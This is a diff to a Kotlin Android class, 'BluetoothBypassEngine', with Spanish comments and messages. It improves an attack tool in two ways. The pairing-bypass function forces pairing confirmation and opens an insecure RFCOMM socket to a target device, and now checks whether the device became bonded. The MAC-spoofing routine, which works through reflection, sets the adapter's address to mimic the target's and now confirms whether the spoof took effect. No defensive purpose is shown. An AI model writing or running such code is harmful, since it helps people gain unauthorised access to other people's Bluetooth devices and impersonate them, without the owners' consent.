@@ -5,6 +5,8 @@ import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothSocket
 import java.util.HashMap
 import java.util.UUID
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.Executors
 
 object BluetoothBypassEngine {
@@ -34,37 +36,46 @@ object BluetoothBypassEngine {
     
     private fun bypassPairing(device: BluetoothDevice): Map<String, Any> {
         val result = HashMap<String, Any>()
-        
+        val latch = CountDownLatch(1)
+
         try {
-            // Intentar emparejamiento sin confirmación usando setPairingConfirmation
             device.setPairingConfirmation(true)
-            
-            // Usar conexión insegura para bypassear algunas verificaciones
             val uuid = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
             val socket: BluetoothSocket = device.createInsecureRfcommSocketToServiceRecord(uuid)
-            
+
             executor.submit {
                 try {
                     socket.connect()
-                    // Si llegamos aquí, el bypass tuvo éxito parcial
-                    result["success"] = true
-                    result["message"] = "Pairing bypass attempted - insecure connection established"
-                    result["connected"] = socket.isConnected
-                    socket.close()
+                    val connected = socket.isConnected
+                    val bonded = device.bondState == BluetoothDevice.BOND_BONDED
+                    result["success"] = connected
+                    result["bonded"] = bonded
+                    result["message"] = when {
+                        bonded -> "Pairing bypass: dispositivo emparejado"
+                        connected -> "Pairing bypass: conexión insegura establecida"
+                        else -> "Pairing bypass: sin conexión"
+                    }
+                    result["connected"] = connected
                 } catch (e: Exception) {
                     result["success"] = false
                     result["message"] = "Bypass failed: ${e.message}"
+                    result["connected"] = false
+                } finally {
+                    try { socket.close() } catch (_: Exception) {}
+                    latch.countDown()
                 }
             }
-            
-            // Esperar un poco para el resultado
-            Thread.sleep(3000)
-            
+
+            latch.await(8, TimeUnit.SECONDS)
+            if (!result.containsKey("success")) {
+                result["success"] = false
+                result["message"] = "Pairing bypass: timeout"
+            }
         } catch (e: Exception) {
             result["success"] = false
             result["message"] = "Exception: ${e.message}"
         }
-        
+
         return result
     }
     
@@ -83,8 +94,12 @@ object BluetoothBypassEngine {
                 // Spoof a MAC similar a la del dispositivo objetivo
                 val spoofedMac = device.address.substring(0, 15) + "0"
                 setAddressMethod.invoke(adapter, spoofedMac)
-                result["success"] = true
-                result["message"] = "MAC spoof attempted: $spoofedMac"
+                val currentAddress = adapter.address
+                val changed = currentAddress.equals(spoofedMac, ignoreCase = true)
+                result["success"] = changed
+                result["spoofedMac"] = spoofedMac
+                result["currentAddress"] = currentAddress
+                result["message"] = if (changed) "MAC spoof applied: $spoofedMac" else "MAC spoof no verificado (sigue $currentAddress)"
             } catch (e: Exception) {
                 result["success"] = false
                 result["message"] = "MAC spoof requires root: ${e.message}"
